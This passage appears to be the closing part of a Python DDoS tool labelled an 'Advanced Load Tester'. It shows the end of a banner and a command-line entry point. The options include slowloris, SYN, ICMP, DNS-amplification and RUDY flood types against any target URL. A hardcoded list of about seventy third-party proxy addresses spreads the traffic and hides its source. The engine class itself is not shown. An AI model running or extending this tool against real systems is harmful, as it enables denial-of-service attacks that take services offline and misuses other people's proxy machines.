                          +$;X&&&$x;;::;;$&&&&&&$X;x$X$;                                            
                          :X&$xx$&&&&&&&&&&&$$XXX$$X;                                               
                          ::++$&$Xx++xx+xxXX$$&&$x;:.                                               
                           .  ;;+$xX&&&$$$&&&;                                                      
                                  :     .:+:                                           
{Style.RESET_ALL}
    """)
    

if __name__ == "__main__":
    print_banner()
    parser = argparse.ArgumentParser(description="Advanced Load Tester")
    parser.add_argument('--target', required=True, help="Target URL")
    parser.add_argument('--type', default='mixed', choices=['http', 'slowloris', 'udp', 'mixed', 'websocket', 'syn', 'icmp', 'dns_amp', 'rudy'], help="Attack type")
    parser.add_argument('--duration', type=int, default=120, help="Duration in seconds")
    parser.add_argument('--rate', type=int, default=1000, help="Requests per second")
    parser.add_argument('--connections', type=int, default=500, help="Concurrent connections")
    parser.add_argument('--http2', action='store_true', help="Enable HTTP/2")
    parser.add_argument('--websocket', action='store_true', help="Enable WebSocket")
    args = parser.parse_args()
    
    proxy_string = "http://103.94.52.70:3128,http://190.103.177.131:80,http://139.99.237.62:80,http://103.249.120.207:80,http://209.97.150.167:8080,http://123.30.154.171:7777,http://188.166.197.129:3128,http://43.156.183.112:1080,http://57.129.81.201:8080,http://66.36.234.130:1339,http://32.223.6.94:80,http://133.18.234.13:80,http://41.191.203.160:80,http://42.119.115.86:30072,http://103.65.237.92:5678,http://190.58.248.86:80,http://50.122.86.118:80,http://162.243.149.86:31028,http://42.113.20.121:16000,http://91.121.208.196:5062,http://1.52.198.121:16000,http://27.79.185.129:16000,http://27.79.228.60:16000,http://115.72.173.170:10009,http://27.79.185.151:16000,http://27.79.223.40:16000,http://27.79.128.157:16000,http://124.6.51.226:8099,http://78.38.53.36:80,http://27.76.179.148:16000,http://123.141.181.43:5031,http://41.59.90.175:80,http://40.192.110.77:51773,http://134.209.229.237:3139,http://4.156.78.45:80,http://47.91.124.149:20000,http://123.141.181.31:5031,http://23.247.136.248:80,http://152.53.107.230:80,http://72.10.164.178:28247,http://172.98.201.190:3128,http://23.247.136.254:80,http://92.67.186.210:80,http://154.118.231.30:80,http://4.195.16.140:80,http://45.146.163.31:80,http://108.141.130.146:80,http://134.209.29.120:80,http://201.148.32.162:80,http://195.158.8.123:3128,http://42.113.20.12:16000,http://62.99.138.162:80,http://189.202.188.149:80,http://41.191.203.162:80,http://203.162.13.222:6868,http://203.162.13.26:6868,http://89.58.55.33:80,http://213.143.113.82:80,http://219.65.73.81:80,http://89.58.57.45:80,http://181.41.194.186:80,http://41.59.90.168:80,http://152.53.168.53:44887,http://143.42.66.91:80,http://103.190.120.19:30011,http://185.82.218.85:80,http://179.96.28.58:80,http://123.141.181.1:5031,http://5.45.126.128:8080"
    proxy_list = [p.strip() for p in proxy_string.split(',') if p.strip()]
    
    tester = AdvancedLoadTester(
        target_url=args.target,
        attack_type=args.type,
        duration=args.duration,
        rate=args.rate,
        concurrent_connections=args.connections,
        proxy_list=proxy_list,
        log_level="DEBUG",
        enable_http2=args.http2,
        enable_websocket=args.websocket
    )
    
    try:
        tester.start()
    except KeyboardInterrupt:
        tester.stop()
        print("\n\nStopped by user")
    except Exception as e:
        print(f"\n\nError: {e}")
    

    print("\n\nCompleted")


